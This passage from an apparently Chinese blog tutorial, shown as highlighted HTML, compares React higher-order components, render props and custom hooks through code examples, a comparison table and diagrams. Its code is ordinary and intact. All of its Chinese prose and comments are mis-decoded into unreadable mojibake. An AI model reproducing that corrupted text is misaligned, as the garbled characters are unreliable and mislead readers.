language_">this</span>.<span class="hljs-property">props</span>;<br>      <br>      <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">WrappedComponent</span> </span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;forwardedRef&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">          &#123;<span class="hljs-attr">...rest</span>&#125; </span></span><br><span class="hljs-tag"><span class="language-xml">        /&gt;</span></span><br>      );<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-comment">// ä½¿ç”¨ forwardRef è½¬å‘ ref</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">React</span>.<span class="hljs-title function_">forwardRef</span>(<span class="hljs-function">(<span class="hljs-params">props, ref</span>) =&gt;</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">WithRefForwarding</span> &#123;<span class="hljs-attr">...props</span>&#125; <span class="hljs-attr">forwardedRef</span>=<span class="hljs-string">&#123;ref&#125;</span> /&gt;</span></span><br>  ));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Render-Props-æ·±åº¦è§£æ"><a href="#Render-Props-æ·±åº¦è§£æ" class="headerlink" title="Render Props æ·±åº¦è§£æ"></a>Render Props æ·±åº¦è§£æ</h3><p><strong>Render Props æ ¸å¿ƒæ¦‚å¿µ</strong></p><p>å®šä¹‰ï¼šç»„ä»¶é€šè¿‡ä¸€ä¸ªå‡½æ•° propï¼ˆé€šå¸¸å‘½åä¸º render æˆ– childrenï¼‰æ¥åŠ¨æ€å†³å®šæ¸²æŸ“å†…å®¹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;<span class="hljs-title class_">DataProvider</span> render=&#123;<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> (<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;data&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>)&#125; /&gt;<br></code></pre></td></tr></table></figure><p><strong>åŸºç¡€å®ç°æ¨¡å¼</strong></p><p>(1) æ ‡å‡† Render Prop</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MouseTracker</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">x</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">0</span> &#125;;<br>  <br>  handleMouseMove = <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<br>      <span class="hljs-attr">x</span>: event.<span class="hljs-property">clientX</span>,<br>      <span class="hljs-attr">y</span>: event.<span class="hljs-property">clientY</span><br>    &#125;);<br>  &#125;;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onMouseMove</span>=<span class="hljs-string">&#123;this.handleMouseMove&#125;</span>&gt;</span></span><br><span class="language-xml">        &#123;this.props.render(this.state)&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br>&lt;<span class="hljs-title class_">MouseTracker</span> render=&#123;<span class="hljs-function">(<span class="hljs-params">&#123; x, y &#125;</span>) =&gt;</span> (<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>é¼ æ ‡ä½ç½®: (&#123;x&#125;, &#123;y&#125;)<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br>)&#125; /&gt;<br></code></pre></td></tr></table></figure><p>(2) Children as Function</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Toggle</span>(<span class="hljs-params">&#123; children &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [on, setOn] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggle</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-title function_">setOn</span>(!on);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">children</span>(&#123;<br>    on,<br>    toggle<br>  &#125;);<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br>&lt;<span class="hljs-title class_">Toggle</span>&gt;<br>  &#123;<span class="hljs-function">(<span class="hljs-params">&#123; on, toggle &#125;</span>) =&gt;</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;toggle&#125;</span>&gt;</span></span><br><span class="language-xml">        &#123;on ? &#x27;ON&#x27; : &#x27;OFF&#x27;&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      &#123;on &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">Modal</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;å¼€å¯çŠ¶æ€&quot;</span> /&gt;</span>&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )&#125;<br>&lt;/<span class="hljs-title class_">Toggle</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>é«˜çº§ Render Props æ¨¡å¼</strong></p><p>(1) ç»„åˆå¤šä¸ª Render Props</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">CombinedProvider</span>(<span class="hljs-params">&#123; data, theme, children &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">DataProvider</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span>&gt;</span></span><br><span class="language-xml">      &#123;dataProps =&gt; (</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">ThemeProvider</span> <span class="hljs-attr">theme</span>=<span class="hljs-string">&#123;theme&#125;</span>&gt;</span></span><br><span class="language-xml">          &#123;themeProps =&gt; children(&#123; ...dataProps, ...themeProps &#125;)&#125;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeProvider</span>&gt;</span></span><br><span class="language-xml">      )&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">DataProvider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br>&lt;<span class="hljs-title class_">CombinedProvider</span> data=&#123;apiData&#125; theme=<span class="hljs-string">&quot;dark&quot;</span>&gt;<br>  &#123;<span class="hljs-function">(<span class="hljs-params">&#123; data, loading, theme &#125;</span>) =&gt;</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;</span>`<span class="hljs-attr">app</span> $&#123;<span class="hljs-attr">theme</span>&#125;`&#125;&gt;</span></span><br><span class="language-xml">      &#123;loading ? <span class="hljs-tag">&lt;<span class="hljs-name">Spinner</span> /&gt;</span> : <span class="hljs-tag">&lt;<span class="hljs-name">Content</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> /&gt;</span>&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )&#125;<br>&lt;/<span class="hljs-title class_">CombinedProvider</span>&gt;<br></code></pre></td></tr></table></figure><p>(2) Render Props + Hooks</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useCounter</span>(<span class="hljs-params">initialCount = <span class="hljs-number">0</span></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(initialCount);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">increment</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c + <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">decrement</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c - <span class="hljs-number">1</span>);<br>  <br>  <span class="hljs-keyword">return</span> &#123; count, increment, decrement &#125;;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params">&#123; children &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> counter = <span class="hljs-title function_">useCounter</span>();<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">children</span>(counter);<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br>&lt;<span class="hljs-title class_">Counter</span>&gt;<br>  &#123;<span class="hljs-function">(<span class="hljs-params">&#123; count, increment, decrement &#125;</span>) =&gt;</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;decrement&#125;</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;increment&#125;</span>&gt;</span>+<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )&#125;<br>&lt;/<span class="hljs-title class_">Counter</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="HOC-ä¸-Render-Props-å¯¹æ¯”"><a href="#HOC-ä¸-Render-Props-å¯¹æ¯”" class="headerlink" title="HOC ä¸ Render Props å¯¹æ¯”"></a>HOC ä¸ Render Props å¯¹æ¯”</h3><p><strong>æŠ€æœ¯å¯¹æ¯”</strong></p><pre class="mermaid">graph LR    A[HOC] --> B[å±æ€§ä»£ç†]    A --> C[åå‘ç»§æ‰¿]    D[Render Props] --> E[å‡½æ•°ä½œä¸ºå­ç»„ä»¶]    D --> F[Render Prop]        B --> G[æ³¨å…¥Props]    C --> H[æ“ä½œç»„ä»¶]    E --> I[ç›´æ¥ç»„åˆ]    F --> I</pre><p><strong>è¯¦ç»†å¯¹æ¯”åˆ†æ</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">é«˜é˜¶ç»„ä»¶ (HOC)</th><th align="left">Render Props</th></tr></thead><tbody><tr><td align="left">å¤ç”¨æ–¹å¼</td><td align="left">ç»„ä»¶ä½œä¸ºå‚æ•°è¿”å›å¢å¼ºç»„ä»¶</td><td align="left">å‡½æ•°ä½œä¸ºpropæ¸²æŸ“å†…å®¹</td></tr><tr><td align="left">ç»„ä»¶å…³ç³»</td><td align="left">åŒ…è£…å…³ç³»</td><td align="left">åŒ…å«å…³ç³»</td></tr><tr><td align="left">è°ƒè¯•éš¾åº¦</td><td align="left">è¾ƒéš¾ï¼ˆå¤šå±‚åŒ…è£…ï¼‰</td><td align="left">è¾ƒæ˜“ï¼ˆç›´æ¥æ˜¾ç¤ºï¼‰</td></tr><tr><td align="left">é™æ€ç±»å‹</td><td align="left">ç±»å‹æ¨å¯¼å¤æ‚</td><td align="left">ç±»å‹æ¨å¯¼ç®€å•</td></tr><tr><td align="left">çµæ´»æ€§</td><td align="left">ä¸­ç­‰</td><td align="left">é«˜</td></tr><tr><td align="left">æ€§èƒ½å½±å“</td><td align="left">å¯èƒ½å¼•èµ·é¢å¤–æ¸²æŸ“</td><td align="left">å¯èƒ½å¼•èµ·é¢å¤–æ¸²æŸ“</td></tr><tr><td align="left">å­¦ä¹ æ›²çº¿</td><td align="left">è¾ƒé™¡å³­</td><td align="left">è¾ƒå¹³ç¼“</td></tr><tr><td align="left">é€‚ç”¨åœºæ™¯</td><td align="left">æ¨ªåˆ‡å…³æ³¨ç‚¹</td><td align="left">åŠ¨æ€ç»„åˆ</td></tr></tbody></table><h3 id="ä¼ä¸šçº§æœ€ä½³å®è·µ-2"><a href="#ä¼ä¸šçº§æœ€ä½³å®è·µ-2" class="headerlink" title="ä¼ä¸šçº§æœ€ä½³å®è·µ"></a>ä¼ä¸šçº§æœ€ä½³å®è·µ</h3><p><strong>æƒé™æ§åˆ¶</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">withAuthorization</span>(<span class="hljs-params">requiredRoles</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-params">WrappedComponent</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">AuthorizedComponent</span> = props =&gt; &#123;<br>      <span class="hljs-keyword">const</span> &#123; user &#125; = <span class="hljs-title function_">useAuth</span>();<br>      <br>      <span class="hljs-keyword">if</span> (!user || !requiredRoles.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">role</span> =&gt;</span> user.<span class="hljs-property">roles</span>.<span class="hljs-title function_">includes</span>(role))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ForbiddenPage</span> /&gt;</span></span>;<br>      &#125;<br>      <br>      <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">WrappedComponent</span> &#123;<span class="hljs-attr">...props</span>&#125; /&gt;</span></span>;<br>    &#125;;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">AuthorizedComponent</span>;<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">AdminDashboard</span> = <span class="hljs-title function_">withAuthorization</span>([<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;superadmin&#x27;</span>])(<span class="hljs-title class_">Dashboard</span>);<br></code></pre></td></tr></table></figure><h3 id="ç°ä»£æ›¿ä»£æ–¹æ¡ˆï¼šè‡ªå®šä¹‰-Hooks"><a href="#ç°ä»£æ›¿ä»£æ–¹æ¡ˆï¼šè‡ªå®šä¹‰-Hooks" class="headerlink" title="ç°ä»£æ›¿ä»£æ–¹æ¡ˆï¼šè‡ªå®šä¹‰ Hooks"></a>ç°ä»£æ›¿ä»£æ–¹æ¡ˆï¼šè‡ªå®šä¹‰ Hooks</h3><p><strong>é‡æ„ HOC ä¸º Hook</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŸ HOC</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">withWindowSize</span>(<span class="hljs-params">WrappedComponent</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">extends</span> <span class="hljs-title class_">React</span>.<span class="hljs-property">Component</span> &#123;<br>    state = &#123; <span class="hljs-attr">width</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>, <span class="hljs-attr">height</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span> &#125;;<br>    <br>    handleResize = <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<br>        <span class="hljs-attr">width</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>,<br>        <span class="hljs-attr">height</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span><br>      &#125;);<br>    &#125;;<br>    <br>    <span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;resize&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleResize</span>);<br>    &#125;<br>    <br>    <span class="hljs-title function_">componentWillUnmount</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;resize&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleResize</span>);<br>    &#125;<br>    <br>    <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">WrappedComponent</span> &#123;<span class="hljs-attr">...this.props</span>&#125; <span class="hljs-attr">windowSize</span>=<span class="hljs-string">&#123;this.state&#125;</span> /&gt;</span></span>;<br>    &#125;<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// è‡ªå®šä¹‰ Hook</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useWindowSize</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [size, setSize] = <span class="hljs-title function_">useState</span>(&#123;<br>    <span class="hljs-attr">width</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>,<br>    <span class="hljs-attr">height</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span><br>  &#125;);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleResize</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>      <span class="hljs-title function_">setSize</span>(&#123;<br>        <span class="hljs-attr">width</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>,<br>        <span class="hljs-attr">height</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span><br>      &#125;);<br>    &#125;;<br>    <br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;resize&#x27;</span>, handleResize);<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;resize&#x27;</span>, handleResize);<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ResponsiveComponent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; width &#125; = <span class="hljs-title function_">useWindowSize</span>();<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>çª—å£å®½åº¦: &#123;width&#125;px<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é‡æ„ Render Props ä¸º Hook</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŸ Render Prop ç»„ä»¶</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataFetcher</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">loading</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span> &#125;;<br>  <br>  <span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">url</span>)<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; data, <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span> &#125;))<br>      .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; error, <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span> &#125;));<br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-title function_">children</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// è‡ªå®šä¹‰ Hook</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useDataFetcher</span>(<span class="hljs-params">url</span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(&#123; <br>    <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span>, <br>    <span class="hljs-attr">loading</span>: <span class="hljs-literal">true</span>, <br>    <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span> <br>  &#125;);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">setState</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> (&#123; ...prev, <span class="hljs-attr">loading</span>: <span class="hljs-literal">true</span> &#125;));<br>    <br>    <span class="hljs-title function_">fetch</span>(url)<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-title function_">setState</span>(&#123; data, <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span> &#125;))<br>      .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>, error &#125;));<br>  &#125;, [url]);<br>  <br>  <span class="hljs-keyword">return</span> state;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params">&#123; userId &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; data, loading &#125; = <span class="hljs-title function_">useDataFetcher</span>(<span class="hljs-string">`/api/users/<span class="hljs-subst">$&#123;userId&#125;</span>`</span>);<br>  <br>  <span class="hljs-keyword">if</span> (loading) <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Spinner</span> /&gt;</span></span>;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProfileCard</span> <span class="hljs-attr">user</span>=<span class="hljs-string">&#123;data&#125;</span> /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è®¾è®¡æ¨¡å¼é€‰æ‹©æŒ‡å—"><a href="#è®¾è®¡æ¨¡å¼é€‰æ‹©æŒ‡å—" class="headerlink" title="è®¾è®¡æ¨¡å¼é€‰æ‹©æŒ‡å—"></a>è®¾è®¡æ¨¡å¼é€‰æ‹©æŒ‡å—</h3><p><strong>æ¨¡å¼é€‰æ‹©å†³ç­–</strong></p><pre class="mermaid">graph TD    A[éœ€è¦é€»è¾‘å¤ç”¨] --> B{éœ€è¦è®¿é—®ç»„ä»¶å†…éƒ¨?}    B -->|æ˜¯| C[Render Props]    B -->|å¦| D{éœ€è¦åŒ…è£…ç»„ä»¶?}    D -->|æ˜¯| E[HOC]    D -->|å¦| F[è‡ªå®šä¹‰ Hook]    C --> G{åŠŸèƒ½ç®€å•?}    G 